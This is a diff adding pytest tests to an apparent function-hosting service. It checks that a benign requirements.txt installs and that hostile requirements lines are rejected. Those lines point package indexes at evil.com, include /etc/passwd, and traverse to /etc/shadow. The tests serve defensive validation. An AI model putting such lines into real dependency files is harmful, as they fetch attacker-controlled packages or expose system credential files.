@@ -194,6 +194,77 @@ def test_invoke_executes_function(client):
 
 
 # ---------------------------------------------------------------------------
+# requirements.txt — benign (installs a real package)
+# ---------------------------------------------------------------------------
+
+DEPS_CODE = '''\
+import humanize
+
+def handler(event=None):
+    n = (event or {}).get("n", 1000)
+    return {"formatted": humanize.intcomma(n)}
+'''
+
+
+def test_function_with_requirements_reaches_ready(client):
+    token = _register_and_login(client, "deps_user")
+    pkg = _make_zip({
+        "main.py": DEPS_CODE,
+        "requirements.txt": "humanize==4.9.0\n",
+    })
+
+    r = client.post(
+        "/functions",
+        data={"name": "with_deps"},
+        files={"package": ("deps.zip", pkg, "application/zip")},
+        headers=_auth(token),
+    )
+    assert r.status_code == 201
+
+    r = client.post("/functions/with_deps/verify", headers=_auth(token))
+    assert r.status_code == 200, r.text
+    assert r.json()["status"] == "READY"
+
+
+# ---------------------------------------------------------------------------
+# requirements.txt — malicious (injection attempts rejected)
+# ---------------------------------------------------------------------------
+
+@pytest.mark.parametrize("req_line,description", [
+    ("-r /etc/passwd",                    "file inclusion via -r"),
+    ("-i https://evil.com/simple",        "index override short -i"),
+    ("-f https://evil.com/",             "find-links short -f"),
+    ("-e .",                              "editable install -e"),
+    ("--index-url https://evil.com",      "index override long form"),
+    ("--extra-index-url https://evil.com","extra index override"),
+    ("--find-links https://evil.com/",    "find-links long form"),
+    ("git+https://github.com/evil/x.git", "VCS URL git+"),
+    ("./local_package",                   "local relative path"),
+    ("../../../etc/shadow",               "path traversal"),
+    ("file:///etc/passwd",                "file:// URL"),
+])
+def test_malicious_requirements_rejected(client, req_line, description):
+    username = f"malreq_{abs(hash(req_line)) % 100000}"
+    token = _register_and_login(client, username)
+    pkg = _make_zip({
+        "main.py": BENIGN_CODE,
+        "requirements.txt": req_line + "\n",
+    })
+
+    r = client.post(
+        "/functions",
+        data={"name": "malreq"},
+        files={"package": ("mal.zip", pkg, "application/zip")},
+        headers=_auth(token),
+    )
+    assert r.status_code == 201
+
+    r = client.post("/functions/malreq/verify", headers=_auth(token))
+    assert r.status_code == 500, f"{description}: expected rejection, got {r.status_code} — {r.text}"
+    assert "preparation failed" in r.json()["detail"].lower(), r.json()
+
+
+# ---------------------------------------------------------------------------
 # Verify unknown function — 404
 # ---------------------------------------------------------------------------
 
